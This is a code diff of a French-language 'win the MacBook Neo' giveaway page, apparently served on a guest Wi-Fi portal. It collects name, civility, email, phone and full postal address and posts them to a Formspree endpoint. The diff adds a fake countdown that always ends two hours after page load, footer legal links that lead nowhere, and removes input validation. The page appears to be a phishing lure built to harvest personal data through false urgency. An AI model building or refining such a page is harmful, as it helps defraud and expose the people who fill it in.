@@ -13,7 +13,6 @@ body {
   color: white;
 }
 
-/* CARD */
 .container {
   padding: 20px;
   text-align: center;
@@ -26,14 +25,28 @@ body {
   backdrop-filter: blur(25px);
   border-radius: 25px;
   padding: 25px;
-  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+  box-shadow: 0 20px 40px rgba(0,0,0,0.3);
 }
 
-/* IMAGE */
 img.main {
   width: 100%;
   border-radius: 20px;
   margin-bottom: 20px;
+}
+
+/* DATE */
+.date {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #bae6fd;
+}
+
+/* TIMER */
+.timer {
+  margin-top: 10px;
+  font-size: 20px;
+  font-weight: bold;
+  color: #facc15;
 }
 
 /* INPUT */
@@ -43,7 +56,6 @@ input {
   margin: 10px 0;
   border-radius: 12px;
   border: none;
-  outline: none;
   font-size: 15px;
 }
 
@@ -57,46 +69,73 @@ input {
   font-weight: bold;
   width: 100%;
   margin-top: 20px;
-  font-size: 16px;
 }
 
-/* CIVILITE APPLE STYLE */
+/* CIVILITE STYLE iOS */
 .civilite {
   display: flex;
-  background: rgba(255,255,255,0.15);
-  border-radius: 30px;
-  padding: 5px;
+  justify-content: center;
+  gap: 30px;
   margin: 20px 0;
 }
 
-.civilite button {
-  flex: 1;
-  padding: 12px;
-  border-radius: 30px;
-  border: none;
-  background: transparent;
-  color: white;
-  font-weight: 500;
+.switch {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.switch input {
+  display: none;
+}
+
+.slider {
+  width: 40px;
+  height: 22px;
+  background: #ccc;
+  border-radius: 20px;
+  position: relative;
+}
+
+.slider::before {
+  content: "";
+  width: 18px;
+  height: 18px;
+  background: white;
+  border-radius: 50%;
+  position: absolute;
+  top: 2px;
+  left: 2px;
   transition: 0.3s;
 }
 
-.civilite button.active {
-  background: white;
-  color: #1e3a8a;
-  box-shadow: 0 0 10px rgba(255,255,255,0.8);
+.switch input:checked + .slider {
+  background: #22c55e;
 }
 
-/* HIDDEN */
+.switch input:checked + .slider::before {
+  transform: translateX(18px);
+}
+
+/* FOOTER */
+footer {
+  margin-top: 40px;
+  padding: 20px;
+  font-size: 13px;
+  color: #dbeafe;
+  text-align: center;
+}
+
+footer a {
+  color: #e0f2fe;
+  text-decoration: underline;
+  margin: 0 5px;
+}
+
 .hidden {
   display: none;
 }
 
-.success {
-  font-size: 55px;
-  margin-bottom: 10px;
-}
-
-/* ERREUR */
 .error {
   border: 2px solid red;
 }
@@ -112,6 +151,13 @@ input {
 <div id="step1" class="card">
   <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
   <h1>Gagnez le MacBook Neo</h1>
+
+  <div class="date">
+    📅 Tirage le : <span id="dateTirage"></span>
+  </div>
+
+  <div class="timer" id="countdown"></div>
+
   <button class="btn" onclick="showForm()">Participer</button>
 </div>
 
@@ -124,15 +170,26 @@ input {
 
     <!-- CIVILITE -->
     <div class="civilite">
-      <button type="button" onclick="setCivilite(this, 'Mr')">Mr</button>
-      <button type="button" onclick="setCivilite(this, 'Mme')">Mme</button>
+      <label class="switch">
+        <input type="radio" name="civilite" value="Mr">
+        <span class="slider"></span>
+        Mr
+      </label>
+
+      <label class="switch">
+        <input type="radio" name="civilite" value="Mme">
+        <span class="slider"></span>
+        Mme
+      </label>
     </div>
 
     <input type="text" id="nom" placeholder="Nom">
     <input type="text" id="prenom" placeholder="Prénom">
     <input type="email" id="email" placeholder="Email">
     <input type="tel" id="telephone" placeholder="Téléphone">
-    <input type="text" id="adresse" placeholder="Adresse postale complète">
+    <input type="text" id="adresse" placeholder="Adresse (rue)">
+    <input type="text" id="cp" placeholder="Code postal">
+    <input type="text" id="ville" placeholder="Ville">
 
     <button class="btn">Valider</button>
   </form>
@@ -141,88 +198,85 @@ input {
 <!-- PAGE 3 -->
 <div id="step3" class="card hidden">
   <img class="main" src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8">
-  <div class="success">🎉</div>
-  <h2>Bravo !</h2>
+  <h2>🎉 Bravo !</h2>
   <p>Votre participation a bien été enregistrée.</p>
+  <p>Les résultats vous seront communiqués prochainement.</p>
 </div>
 
 </div>
+
+<!-- FOOTER -->
+<footer>
+  © 2026 – Accès Wi-Fi invité. Tous droits réservés •<br>
+  <a href="#">Politique de confidentialité</a> •
+  <a href="#">Conditions générales</a> •
+  <a href="#">Mentions légales</a>
+</footer>
 
 <script>
-let civilite = "";
 
-/* CIVILITE */
-function setCivilite(el, value) {
-  civilite = value;
+/* DATE + TIMER */
+const targetDate = new Date();
+targetDate.setHours(targetDate.getHours() + 2);
 
-  document.querySelectorAll(".civilite button").forEach(btn => {
-    btn.classList.remove("active");
-  });
+document.getElementById("dateTirage").textContent =
+  targetDate.toLocaleDateString("fr-FR");
 
-  el.classList.add("active");
+function updateCountdown() {
+  const now = new Date();
+  const diff = targetDate - now;
+
+  if (diff <= 0) {
+    document.getElementById("countdown").innerHTML = "⏳ Terminé";
+    return;
+  }
+
+  const h = Math.floor(diff / 3600000);
+  const m = Math.floor((diff % 3600000) / 60000);
+  const s = Math.floor((diff % 60000) / 1000);
+
+  document.getElementById("countdown").innerHTML =
+    `⏳ Fin dans : ${h}h ${m}m ${s}s`;
 }
 
-/* NAV */
+setInterval(updateCountdown, 1000);
+
+/* NAVIGATION */
 function showForm() {
   document.getElementById("step1").classList.add("hidden");
   document.getElementById("step2").classList.remove("hidden");
 }
 
-/* VALIDATION */
+/* FORM */
 document.getElementById("contestForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
+  const civilite = document.querySelector('input[name="civilite"]:checked');
   const nom = document.getElementById("nom");
   const prenom = document.getElementById("prenom");
   const email = document.getElementById("email");
   const telephone = document.getElementById("telephone");
   const adresse = document.getElementById("adresse");
+  const cp = document.getElementById("cp");
+  const ville = document.getElementById("ville");
 
-  let valid = true;
-
-  // reset erreurs
-  [nom, prenom, email, telephone, adresse].forEach(f => f.classList.remove("error"));
-
-  // NOM / PRENOM lettres uniquement
-  const regexNom = /^[a-zA-ZÀ-ÿ\- ]+$/;
-  if (!regexNom.test(nom.value)) { nom.classList.add("error"); valid = false; }
-  if (!regexNom.test(prenom.value)) { prenom.classList.add("error"); valid = false; }
-
-  // EMAIL
-  const regexEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  if (!regexEmail.test(email.value)) { email.classList.add("error"); valid = false; }
-
-  // TEL (chiffres uniquement)
-  const regexTel = /^[0-9]{8,15}$/;
-  if (!regexTel.test(telephone.value)) { telephone.classList.add("error"); valid = false; }
-
-  // ADRESSE (minimum longueur)
-  if (adresse.value.length < 5) { adresse.classList.add("error"); valid = false; }
-
-  // CIVILITE
   if (!civilite) {
     alert("Veuillez sélectionner Mr ou Mme");
     return;
   }
 
-  if (!valid) {
-    alert("Veuillez vérifier vos informations");
-    return;
-  }
-
-  // ENVOI
   fetch("https://formspree.io/f/xnjozjby", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      civilite,
+      civilite: civilite.value,
       nom: nom.value,
       prenom: prenom.value,
       email: email.value,
       telephone: telephone.value,
-      adresse: adresse.value
+      adresse: adresse.value,
+      code_postal: cp.value,
+      ville: ville.value
     })
   });
 
